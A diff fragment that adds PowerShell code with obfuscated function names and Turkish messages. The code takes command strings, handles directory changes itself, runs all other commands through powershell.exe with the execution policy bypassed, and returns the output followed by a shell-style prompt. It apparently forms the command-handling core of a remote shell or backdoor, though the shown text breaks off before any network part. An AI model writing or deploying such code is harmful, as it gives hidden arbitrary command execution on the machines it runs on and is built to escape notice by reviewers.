@@ -1,0 +1,52 @@
+function X1Z {
+    param([string]$p7q)
+    if ($p7q -eq "..") {
+        $r9t = (Resolve-Path $p7q -ErrorAction SilentlyContinue).Path
+    }
+    elseif ($p7q.StartsWith('"')) {
+        $q8w = $p7q.Substring(1, $p7q.Length - 2)
+        $r9t = (Resolve-Path $q8w -ErrorAction SilentlyContinue).Path
+        if (-not $r9t) { return $false }
+    }
+    else {
+        $r9t = (Resolve-Path $p7q -ErrorAction SilentlyContinue).Path
+        if (-not $r9t) { return $false }
+    }
+    try {
+        Set-Location $r9t -ErrorAction Stop
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function Y2K {
+    return (Get-Location).Path + ">"
+}
+
+function Z3M {
+    param([string]$e4r)
+    Write-Error "Hata: $e4r (Kod: $LASTEXITCODE)"
+    exit 1
+}
+
+function W4N {
+    param([string]$c5v)
+    if ($c5v.StartsWith("cd")) {
+        $n6x = ""
+        if ($c5v.Length -gt 3) {
+            $n6x = $c5v.Substring(3).Trim()
+        }
+        else {
+            return Y2K
+        }
+        if (X1Z -p7q $n6x) {
+            return Y2K
+        }
+        else {
+            return "Dizin degistirilemedi.`n" + (Y2K)
+        }
+    }
+    try {
+        $r7t = & powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "& { $c5v }" 2>&1 | Out-String
